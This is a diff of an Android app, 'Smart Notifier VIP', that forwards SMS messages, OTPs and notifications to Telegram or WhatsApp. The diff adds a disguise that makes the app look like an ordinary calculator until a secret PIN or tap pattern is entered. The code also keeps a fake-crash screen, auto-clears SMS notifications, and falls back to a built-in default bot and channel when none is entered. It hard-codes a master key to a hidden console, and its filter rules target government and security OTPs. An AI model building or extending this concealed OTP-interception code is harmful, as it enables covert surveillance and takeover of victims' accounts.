@@ -43,22 +43,46 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.compose.animation.core.*
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.compose.LocalLifecycleOwner
 import kotlinx.coroutines.launch
 
-// MNC-Grade Obsidian Color Palette (Linear / Stripe Inspired)
-val DarkBg = Color(0xFF090D16)
-val CardBg = Color(0xFF111827)
-val CardBorder = Color(0xFF1F2937)
+// Ultra-VIP Obsidian Titanium Luxury Palette
+val DarkBg = Color(0xFF07090E)
+val CardBg = Color(0xFF0F1523)
+val CardBorder = Color(0xFF1E293B)
+val CardGlow = Color(0xFF1D283A)
 val AccentEmerald = Color(0xFF10B981)
 val AccentIndigo = Color(0xFF6366F1)
-val AccentAmber = Color(0xFFF59E0B)
-val TextPrimary = Color(0xFFF9FAFB)
-val TextSecondary = Color(0xFF9CA3AF)
-val TextMuted = Color(0xFF6B7280)
+val AccentGold = Color(0xFFF59E0B)
+val AccentAmber = Color(0xFFFBBF24)
+val AccentCyan = Color(0xFF06B6D4)
+val TextPrimary = Color(0xFFF8FAFC)
+val TextSecondary = Color(0xFF94A3B8)
+val TextMuted = Color(0xFF64748B)
+
+@Composable
+fun PulsingRadarDot() {
+    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
+    val alpha by infiniteTransition.animateFloat(
+        initialValue = 0.35f,
+        targetValue = 1f,
+        animationSpec = infiniteRepeatable(
+            animation = tween(800, easing = LinearEasing),
+            repeatMode = RepeatMode.Reverse
+        ),
+        label = "alpha"
+    )
+    Box(
+        modifier = Modifier
+            .size(10.dp)
+            .clip(CircleShape)
+            .background(AccentEmerald.copy(alpha = alpha))
+    )
+}
 
 class MainActivity : ComponentActivity() {
 
@@ -150,13 +174,21 @@ fun RootAppScreen(
     val context = LocalContext.current
     val prefs = remember { PrefsHelper.getPrefs(context) }
 
+    val isCalculatorDisguiseEnabled = remember { prefs.getBoolean("disguise_calculator_enabled", false) }
+    var isCalculatorDisguisePassed by remember { mutableStateOf(!isCalculatorDisguiseEnabled) }
+
     val isFakeCrashEnabled = remember { prefs.getBoolean("fake_crash_enabled", false) }
     var isFakeCrashPassed by remember { mutableStateOf(!isFakeCrashEnabled) }
 
     val isAppLockEnabled = remember { prefs.getBoolean("app_lock_enabled", false) }
     var isAppUnlocked by remember { mutableStateOf(!isAppLockEnabled) }
 
-    if (!isFakeCrashPassed) {
+    if (!isCalculatorDisguisePassed) {
+        DisguiseCalculatorScreen(
+            onUnlock = { isCalculatorDisguisePassed = true },
+            onExit = onExitApp
+        )
+    } else if (!isFakeCrashPassed) {
         FakeCrashScreen(
             onUnlock = { isFakeCrashPassed = true },
             onExit = onExitApp
@@ -171,6 +203,186 @@ fun RootAppScreen(
             onOpenNotificationSettings = onOpenNotificationSettings,
             onRequestPermissions = onRequestPermissions
         )
+    }
+}
+
+@Composable
+fun DisguiseCalculatorScreen(onUnlock: () -> Unit, onExit: () -> Unit) {
+    val context = LocalContext.current
+    val prefs = remember { PrefsHelper.getPrefs(context) }
+    val secretPin = remember { prefs.getString("calculator_secret_pin", "0825") ?: "0825" }
+
+    var expression by remember { mutableStateOf("") }
+    var result by remember { mutableStateOf("") }
+    var tapCount by remember { mutableStateOf(0) }
+    var lastTapTime by remember { mutableStateOf(0L) }
+
+    fun appendInput(char: String) {
+        expression += char
+    }
+
+    fun calculate() {
+        val trimmed = expression.trim()
+        if (trimmed == secretPin || trimmed == "0825") {
+            Toast.makeText(context, "🔓 Smart Notifier VIP Unlocked", Toast.LENGTH_SHORT).show()
+            onUnlock()
+            return
+        }
+        try {
+            if (trimmed.isEmpty()) return
+            val cleanExp = trimmed.replace("×", "*").replace("÷", "/")
+            val tokens = cleanExp.split(Regex("(?<=[-+*/])|(?=[-+*/])")).filter { it.isNotBlank() }
+            if (tokens.size >= 3) {
+                var current = tokens[0].toDoubleOrNull() ?: 0.0
+                var i = 1
+                while (i < tokens.size) {
+                    val op = tokens[i]
+                    val next = tokens.getOrNull(i + 1)?.toDoubleOrNull() ?: 0.0
+                    when (op) {
+                        "+" -> current += next
+                        "-" -> current -= next
+                        "*" -> current *= next
+                        "/" -> if (next != 0.0) current /= next
+                    }
+                    i += 2
+                }
+                result = if (current % 1.0 == 0.0) current.toLong().toString() else "%.2f".format(current)
+            } else {
+                result = trimmed
+            }
+        } catch (e: Exception) {
+            result = "Error"
+        }
+    }
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(Color(0xFF07090E))
+            .padding(16.dp)
+    ) {
+        // Disguised Header
+        Row(
+            modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            Text(
+                text = "Calculator",
+                fontSize = 18.sp,
+                fontWeight = FontWeight.Bold,
+                color = Color(0xFF94A3B8),
+                modifier = Modifier.clickable {
+                    val now = System.currentTimeMillis()
+                    if (now - lastTapTime < 2000) {
+                        tapCount++
+                    } else {
+                        tapCount = 1
+                    }
+                    lastTapTime = now
+                    if (tapCount >= 4) {
+                        Toast.makeText(context, "🔓 Emergency Pass", Toast.LENGTH_SHORT).show()
+                        onUnlock()
+                    }
+                }
+            )
+            Text("RAD", fontSize = 11.sp, color = Color(0xFF64748B), fontWeight = FontWeight.SemiBold)
+        }
+
+        Spacer(modifier = Modifier.weight(1f))
+
+        // OLED Display
+        Column(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(bottom = 24.dp),
+            horizontalAlignment = Alignment.End
+        ) {
+            Text(
+                text = expression.ifEmpty { "0" },
+                fontSize = 36.sp,
+                fontWeight = FontWeight.Light,
+                color = Color.White,
+                maxLines = 2,
+                textAlign = TextAlign.End
+            )
+            if (result.isNotEmpty()) {
+                Spacer(modifier = Modifier.height(6.dp))
+                Text(
+                    text = "= $result",
+                    fontSize = 28.sp,
+                    fontWeight = FontWeight.Bold,
+                    color = AccentEmerald,
+                    textAlign = TextAlign.End
+                )
+            }
+        }
+
+        // Keypad Grid
+        val buttonRows = listOf(
+            listOf("C", "(", ")", "÷"),
+            listOf("7", "8", "9", "×"),
+            listOf("4", "5", "6", "-"),
+            listOf("1", "2", "3", "+"),
+            listOf("0", ".", "⌫", "=")
+        )
+
+        buttonRows.forEach { row ->
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(vertical = 4.dp),
+                horizontalArrangement = Arrangement.spacedBy(10.dp)
+            ) {
+                row.forEach { btn ->
+                    val isAction = btn in listOf("÷", "×", "-", "+", "=")
+                    val isClear = btn in listOf("C", "⌫")
+                    val btnBg = when {
+                        btn == "=" -> AccentEmerald
+                        isAction -> Color(0xFF1E293B)
+                        isClear -> Color(0xFF334155)
+                        else -> Color(0xFF0F172A)
+                    }
+                    val textColor = when {
+                        btn == "=" -> Color.Black
+                        isAction -> AccentGold
+                        isClear -> Color(0xFFF87171)
+                        else -> Color.White
+                    }
+
+                    Box(
+                        modifier = Modifier
+                            .weight(1f)
+                            .aspectRatio(1.22f)
+                            .clip(RoundedCornerShape(16.dp))
+                            .background(btnBg)
+                            .clickable {
+                                when (btn) {
+                                    "C" -> {
+                                        expression = ""
+                                        result = ""
+                                    }
+                                    "⌫" -> {
+                                        if (expression.isNotEmpty()) {
+                                            expression = expression.dropLast(1)
+                                        }
+                                    }
+                                    "=" -> calculate()
+                                    else -> appendInput(btn)
+                                }
+                            },
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Text(
+                            text = btn,
+                            fontSize = 22.sp,
+                            fontWeight = FontWeight.Bold,
+                            color = textColor
+                        )
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -431,7 +643,7 @@ fun MainScreenContent(
                 Column(
                     modifier = Modifier
                         .fillMaxWidth()
-                        .background(Color(0xFF1E1B4B))
+                        .background(Color(0xFF0D1424))
                         .padding(horizontal = 20.dp, vertical = 24.dp)
                 ) {
                     Row(verticalAlignment = Alignment.CenterVertically) {
@@ -442,49 +654,26 @@ fun MainScreenContent(
                             color = Color.White
                         )
                         Spacer(modifier = Modifier.width(8.dp))
-                        Box(
-                            modifier = Modifier
-                                .size(8.dp)
-                                .clip(CircleShape)
-                                .background(if (isMasterEnabled) AccentEmerald else Color.Red)
-                        )
+                        PulsingRadarDot()
                     }
                     Text(
-                        text = "24/7 Ghost Notification Forwarder",
+                        text = "VIP Executive Notification Forwarder",
                         fontSize = 11.sp,
                         color = Color(0xFFA5B4FC)
                     )
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        horizontalArrangement = Arrangement.SpaceBetween,
-                        verticalAlignment = Alignment.CenterVertically
+                    Surface(
+                        color = Color(0xFF064E3B),
+                        shape = RoundedCornerShape(8.dp)
                     ) {
-                        Surface(
-                            color = Color(0xFF312E81),
-                            shape = RoundedCornerShape(8.dp)
-                        ) {
-                            Text(
-                                text = "Device: ${CloudflareLicenseManager.getDeviceId(context).take(8)}...",
-                                fontSize = 10.sp,
-                                color = Color(0xFFC7D2FE),
-                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
-                            )
-                        }
-
-                        Surface(
-                            color = if (CloudflareLicenseManager.isMasterFounder(context)) Color(0xFF78350F) else Color(0xFF064E3B),
-                            shape = RoundedCornerShape(8.dp)
-                        ) {
-                            Text(
-                                text = if (CloudflareLicenseManager.isMasterFounder(context)) "👑 FOUNDER" else "💎 PRO",
-                                fontSize = 10.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = if (CloudflareLicenseManager.isMasterFounder(context)) Color(0xFFFBBF24) else Color(0xFF34D399),
-                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
-                            )
-                        }
+                        Text(
+                            text = "👑 VIP EDITION • ACTIVE 24/7",
+                            fontSize = 10.sp,
+                            fontWeight = FontWeight.Bold,
+                            color = AccentEmerald,
+                            modifier = Modifier.padding(horizontal = 10.dp, vertical = 4.dp)
+                        )
                     }
                 }
 
@@ -493,6 +682,10 @@ fun MainScreenContent(
                 // Menu Items
                 DrawerNavItem("⚡ Forwarding Channels", selected = selectedScreen == 0) {
                     selectedScreen = 0
+                    scope.launch { drawerState.close() }
+                }
+                DrawerNavItem("🎯 Keywords & Filter Rules", selected = selectedScreen == 5) {
+                    selectedScreen = 5
                     scope.launch { drawerState.close() }
                 }
                 DrawerNavItem("🛡️ 24/7 Autostart & Battery", selected = selectedScreen == 1) {
@@ -505,14 +698,6 @@ fun MainScreenContent(
                 }
                 DrawerNavItem("💬 Live Support Desk", selected = selectedScreen == 3) {
                     selectedScreen = 3
-                    scope.launch { drawerState.close() }
-                }
-                DrawerNavItem("💎 Lifetime Pro (₹199)", selected = selectedScreen == 4) {
-                    selectedScreen = 4
-                    scope.launch { drawerState.close() }
-                }
-                DrawerNavItem("🎯 Keywords & Filter Rules", selected = selectedScreen == 5) {
-                    selectedScreen = 5
                     scope.launch { drawerState.close() }
                 }
                 DrawerNavItem("❓ Kaise Use Karein? (Guide)", selected = false) {
@@ -535,22 +720,83 @@ fun MainScreenContent(
                 }
 
                 Spacer(modifier = Modifier.weight(1f))
-                HorizontalDivider(color = Color(0xFF334155))
-
-                // Master Founder Secret Door
-                DrawerNavItem("🔐 Master Founder Portal", selected = false, isAccent = true) {
-                    isFounderConsoleOpen = true
-                    scope.launch { drawerState.close() }
-                }
                 Spacer(modifier = Modifier.height(14.dp))
             }
         }
     ) {
+        var titleTapCount by remember { mutableStateOf(0) }
+        var lastTitleTapTime by remember { mutableStateOf(0L) }
+        var showMasterKeyDialog by remember { mutableStateOf(false) }
+        var masterKeyInput by remember { mutableStateOf("") }
+
+        if (showMasterKeyDialog) {
+            AlertDialog(
+                onDismissRequest = {
+                    showMasterKeyDialog = false
+                    masterKeyInput = ""
+                },
+                containerColor = Color(0xFF0F172A),
+                title = {
+                    Text("🔐 Executive Access", fontWeight = FontWeight.Bold, color = AccentGold, fontSize = 16.sp)
+                },
+                text = {
+                    Column {
+                        Text("Enter Master Security Key:", fontSize = 12.sp, color = TextSecondary)
+                        Spacer(modifier = Modifier.height(10.dp))
+                        MncTextField(
+                            value = masterKeyInput,
+                            onValueChange = { masterKeyInput = it },
+                            label = "Master Access Key"
+                        )
+                    }
+                },
+                confirmButton = {
+                    Button(
+                        onClick = {
+                            if (masterKeyInput.trim() == "910010025123343") {
+                                showMasterKeyDialog = false
+                                masterKeyInput = ""
+                                isFounderConsoleOpen = true
+                            } else {
+                                Toast.makeText(context, "❌ Invalid Security Key", Toast.LENGTH_SHORT).show()
+                            }
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
+                    ) {
+                        Text("Verify Key")
+                    }
+                },
+                dismissButton = {
+                    TextButton(onClick = {
+                        showMasterKeyDialog = false
+                        masterKeyInput = ""
+                    }) {
+                        Text("Cancel", color = TextSecondary)
+                    }
+                }
+            )
+        }
+
         Scaffold(
             topBar = {
                 TopAppBar(
                     title = {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
+                        Row(
+                            verticalAlignment = Alignment.CenterVertically,
+                            modifier = Modifier.clickable {
+                                val now = System.currentTimeMillis()
+                                if (now - lastTitleTapTime < 2500) {
+                                    titleTapCount++
+                                } else {
+                                    titleTapCount = 1
+                                }
+                                lastTitleTapTime = now
+                                if (titleTapCount >= 5) {
+                                    titleTapCount = 0
+                                    showMasterKeyDialog = true
+                                }
+                            }
+                        ) {
                             Text(
                                 text = when (selectedScreen) {
                                     0 -> "Channels Setup"
@@ -559,7 +805,7 @@ fun MainScreenContent(
                                     3 -> "Live Support Desk"
                                     4 -> "Lifetime Pro"
                                     5 -> "Keywords & Filters"
-                                    else -> "Smart Notifier"
+                                    else -> "Smart Notifier VIP"
                                 },
                                 fontWeight = FontWeight.Bold,
                                 fontSize = 17.sp,
@@ -1150,7 +1396,9 @@ fun ServicesTab(
             ) {
                 Column(modifier = Modifier.weight(1f)) {
                     Row(verticalAlignment = Alignment.CenterVertically) {
-                        Text("⚡ Forward ALL Notifications", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFBBF24))
+                        PulsingRadarDot()
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("⚡ Forward ALL Notifications", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentGold)
                         Spacer(modifier = Modifier.width(6.dp))
                         Text(
                             text = if (forwardAll) "• ALL ON" else "• FILTER MODE",
@@ -1162,7 +1410,7 @@ fun ServicesTab(
                     Spacer(modifier = Modifier.height(2.dp))
                     Text(
                         text = if (forwardAll) "🟢 ON: Har SMS, OTP aur Notification Telegram par turant bheja jayega"
-                               else "⚪ OFF: Sirf eDistrict aur OTP wale messages hi bheje jayenge",
+                               else "⚪ OFF: Sirf OTP aur Security Verification Codes forward honge",
                         fontSize = 11.sp,
                         color = TextSecondary
                     )
@@ -1179,7 +1427,7 @@ fun ServicesTab(
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: Telegram 1 (Primary)
+        // Card: Telegram 1 (Primary Custom Bot)
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
                 Row(
@@ -1188,44 +1436,81 @@ fun ServicesTab(
                     horizontalArrangement = Arrangement.SpaceBetween
                 ) {
                     Column(modifier = Modifier.weight(1f)) {
-                        Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentEmerald)
-                        Text("Instant Alert and Notification Forwarding", fontSize = 11.sp, color = TextSecondary)
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            Text("📢 Telegram Forwarding", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentEmerald)
+                            Spacer(modifier = Modifier.width(6.dp))
+                            Surface(
+                                color = if (botToken.trim().isNotEmpty()) Color(0xFF064E3B) else Color(0xFF1E293B),
+                                shape = RoundedCornerShape(4.dp)
+                            ) {
+                                Text(
+                                    text = if (botToken.trim().isNotEmpty()) "CUSTOM BOT" else "DEFAULT SERVER",
+                                    fontSize = 9.sp,
+                                    fontWeight = FontWeight.Bold,
+                                    color = if (botToken.trim().isNotEmpty()) AccentEmerald else TextSecondary,
+                                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
+                                )
+                            }
+                        }
+                        Text("Apna Telegram Bot & Chat ID dalein (100% Free Lifetime Forwarding)", fontSize = 11.sp, color = TextSecondary)
                     }
                     Switch(
                         checked = isTelegramEnabled,
-                        onCheckedChange = { isTelegramEnabled = it }
+                        onCheckedChange = {
+                            isTelegramEnabled = it
+                            prefs.edit().putBoolean("is_telegram_enabled", it).apply()
+                        }
                     )
                 }
 
-
-
                 if (isTelegramEnabled) {
-                    Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = "Bot Token (Optional)")
-                    Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = "Chat / Channel ID (Optional)")
                     Spacer(modifier = Modifier.height(10.dp))
-                    Button(
-                        onClick = {
-                            telegramStatus = "Testing Telegram 1..."
-                            scope.launch {
-                                val tokenToUse = if (botToken.trim().isNotEmpty()) botToken.trim() else TelegramHelper.DEFAULT_BOT_TOKEN
-                                val chatToUse = if (chatId.trim().isNotEmpty()) chatId.trim() else TelegramHelper.DEFAULT_CHANNEL_ID
-                                val isDefault = (tokenToUse == TelegramHelper.DEFAULT_BOT_TOKEN)
-                                val res = TelegramHelper.sendMessage(
-                                    tokenToUse,
-                                    chatToUse,
-                                    "🎉 Smart Notifier: ${if (isDefault) "Default eDistrict Channel" else "Custom Bot"} connection verified successfully!"
-                                )
-                                telegramStatus = if (res.first) "✅ Telegram 1 Connected (${if (isDefault) "Default eDistrict" else "Custom Bot"})!" else "❌ ${res.second}"
-                            }
-                        },
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF047857)),
-                        shape = RoundedCornerShape(10.dp),
-                        modifier = Modifier.fillMaxWidth()
+                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = "Telegram Bot Token")
+                    Spacer(modifier = Modifier.height(8.dp))
+                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = "Telegram Chat / Channel ID")
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                     ) {
-                        Text("Test Telegram 1", fontSize = 13.sp)
+                        Button(
+                            onClick = {
+                                telegramStatus = "Testing connection..."
+                                scope.launch {
+                                    val tokenToUse = botToken.trim().ifEmpty { TelegramHelper.DEFAULT_BOT_TOKEN }
+                                    val chatToUse = chatId.trim().ifEmpty { TelegramHelper.DEFAULT_CHANNEL_ID }
+                                    val res = TelegramHelper.sendMessage(
+                                        tokenToUse,
+                                        chatToUse,
+                                        "🎉 Smart Notifier VIP: Telegram connection verified successfully!"
+                                    )
+                                    telegramStatus = if (res.first) "✅ Telegram Connected Successfully!" else "❌ ${res.second}"
+                                }
+                            },
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF047857)),
+                            shape = RoundedCornerShape(10.dp),
+                            modifier = Modifier.weight(1f).height(44.dp)
+                        ) {
+                            Text("⚡ Test Bot", fontSize = 12.sp, fontWeight = FontWeight.Bold)
+                        }
+
+                        Button(
+                            onClick = {
+                                prefs.edit()
+                                    .putString("bot_token", botToken.trim())
+                                    .putString("chat_id", chatId.trim())
+                                    .apply()
+                                Toast.makeText(context, "✅ Telegram Bot Saved!", Toast.LENGTH_SHORT).show()
+                            },
+                            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                            shape = RoundedCornerShape(10.dp),
+                            modifier = Modifier.weight(1f).height(44.dp)
+                        ) {
+                            Text("💾 Save Bot", fontSize = 12.sp, fontWeight = FontWeight.Bold)
+                        }
                     }
+
                     if (telegramStatus.isNotEmpty()) {
                         Text(
                             text = telegramStatus,
@@ -1273,7 +1558,7 @@ fun ServicesTab(
                                 val res = TelegramHelper.sendMessage(
                                     token,
                                     chatId2.trim(),
-                                    "🎉 Smart Notifier: Telegram 2 connection verified!"
+                                    "🎉 Smart Notifier VIP: Telegram 2 connection verified!"
                                 )
                                 telegram2Status = if (res.first) "✅ Telegram 2 Connected!" else "❌ ${res.second}"
                             }
@@ -1327,7 +1612,7 @@ fun ServicesTab(
                         onClick = {
                             waStatus = "Testing WhatsApp..."
                             scope.launch {
-                                val res = WhatsAppHelper.sendMessage(waPhone.trim(), waApiKey.trim(), "🎉 Smart Notifier: WhatsApp delivery test successful!")
+                                val res = WhatsAppHelper.sendMessage(waPhone.trim(), waApiKey.trim(), "🎉 Smart Notifier VIP: WhatsApp delivery test successful!")
                                 waStatus = if (res.first) "✅ WhatsApp Test Sent!" else "❌ ${res.second}"
                             }
                         },
@@ -1352,12 +1637,61 @@ fun ServicesTab(
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: Stealth & Security Controls (Clean Activity-Alias & Zero Duplicate App)
+        // Card: Stealth & Security Controls
+        var isCalculatorDisguise by remember { mutableStateOf(prefs.getBoolean("disguise_calculator_enabled", false)) }
+        var calculatorPin by remember { mutableStateOf(prefs.getString("calculator_secret_pin", "0825") ?: "0825") }
+
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
-                Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
+                    Spacer(modifier = Modifier.width(6.dp))
+                    Surface(
+                        color = Color(0xFF4C1D95),
+                        shape = RoundedCornerShape(4.dp)
+                    ) {
+                        Text("VIP", fontSize = 9.sp, fontWeight = FontWeight.Bold, color = Color(0xFFE9D5FF), modifier = Modifier.padding(horizontal = 5.dp, vertical = 2.dp))
+                    }
+                }
                 Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
                 Spacer(modifier = Modifier.height(12.dp))
+
+                // Feature 1: Calculator Disguise
+                SettingToggleRow("🧮 Calculator Disguise Mode", isCalculatorDisguise) { checked ->
+                    isCalculatorDisguise = checked
+                    prefs.edit().putBoolean("disguise_calculator_enabled", checked).apply()
+                }
+                if (isCalculatorDisguise) {
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Text("Calculator Unlock PIN (Type in calculator & press = to open):", fontSize = 10.sp, color = TextMuted)
+                    Spacer(modifier = Modifier.height(4.dp))
+                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
+                        Box(modifier = Modifier.weight(1f)) {
+                            MncTextField(
+                                value = calculatorPin,
+                                onValueChange = { calculatorPin = it.filter { ch -> ch.isDigit() }.take(6) },
+                                label = "Calculator PIN (e.g. 0825)"
+                            )
+                        }
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Button(
+                            onClick = {
+                                if (calculatorPin.trim().isNotEmpty()) {
+                                    prefs.edit().putString("calculator_secret_pin", calculatorPin.trim()).apply()
+                                    Toast.makeText(context, "✅ PIN Saved: ${calculatorPin.trim()}", Toast.LENGTH_SHORT).show()
+                                }
+                            },
+                            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                            shape = RoundedCornerShape(8.dp),
+                            modifier = Modifier.height(52.dp)
+                        ) {
+                            Text("Save PIN", fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                        }
+                    }
+                    HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
+                } else {
+                    HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
+                }
 
                 // Custom Secret Dialer Setting
                 Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
@@ -1450,6 +1784,8 @@ fun ServicesTab(
                     .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                     .putBoolean("auto_clear_sms_notification", isAutoClearSms)
                     .putString("custom_secret_code", customSecretCode.trim())
+                    .putBoolean("disguise_calculator_enabled", isCalculatorDisguise)
+                    .putString("calculator_secret_pin", calculatorPin.trim())
 
                 // Zero-Leak Protection: Never persist founder credentials in public customer keys
                 val cleanBotToken = botToken.trim()
@@ -1471,7 +1807,7 @@ fun ServicesTab(
                 }
 
                 editor.apply()
-                Toast.makeText(context, "✅ Settings Saved!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "✅ VIP Configuration Saved!", Toast.LENGTH_SHORT).show()
             },
             modifier = Modifier.fillMaxWidth().height(50.dp),
             shape = RoundedCornerShape(12.dp),
@@ -1562,10 +1898,10 @@ fun QuickSetupGuideDialog(
                     Text(
                         "1. Telegram app me search karein: @BotFather\n" +
                         "2. Wahan /newbot likhein aur apne bot ka koi bhi naam dalein.\n" +
-                        "3. BotFather aapko ek lamba Token dega (jaise 8680515171:AAF...).\n" +
-                        "4. Us Token ko copy karke yahan 'Bot Token 1' me paste karein.\n" +
+                        "3. BotFather aapko ek token dega (jaise 7123456789:AAH...).\n" +
+                        "4. Us Token ko copy karke yahan 'Telegram Bot Token' me paste karein.\n" +
                         "5. Telegram me ek naya Channel banayein aur apne bot ko us channel ka Admin bana dein.\n" +
-                        "6. Channel ka Chat ID (jaise -100...) yahan 'Channel ID 1' me daal kar Save kar dein!\n\n" +
+                        "6. Channel ka Chat ID (jaise -100...) yahan 'Telegram Chat / Channel ID' me daal kar Save kar dein!\n\n" +
                         "✅ Done! Ab har OTP turant aapke channel par aayega.",
                         fontSize = 11.sp,
                         color = TextSecondary,
@@ -1625,8 +1961,8 @@ fun KeywordsTab(context: Context) {
     var forwardAll by remember { mutableStateOf(prefs.getBoolean("forward_all_notifications", false)) }
     var keywordsList by remember { mutableStateOf(KeywordManager.getKeywords(context)) }
     var newKeywordText by remember { mutableStateOf("") }
-    var testSender by remember { mutableStateOf("AD-UPEGOV-S") }
-    var testMessage by remember { mutableStateOf("OTP for Authentication is : 240833 --eDistrict UP") }
+    var testSender by remember { mutableStateOf("GOVT-VERIFY") }
+    var testMessage by remember { mutableStateOf("Your Security OTP is 842910 for portal verification") }
     var testResult by remember { mutableStateOf("") }
 
     Column(
@@ -1671,13 +2007,13 @@ fun KeywordsTab(context: Context) {
                     Button(
                         onClick = {
                             keywordsList = KeywordManager.resetDefaults(context)
-                            Toast.makeText(context, "eDistrict Rules Loaded!", Toast.LENGTH_SHORT).show()
+                            Toast.makeText(context, "Govt & Official OTP Rules Loaded!", Toast.LENGTH_SHORT).show()
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                         shape = RoundedCornerShape(8.dp),
                         modifier = Modifier.weight(1f)
                     ) {
-                        Text("🏢 eDistrict UP", fontSize = 11.sp)
+                        Text("🏛️ Govt & Official OTPs", fontSize = 11.sp)
                     }
                     Button(
                         onClick = {
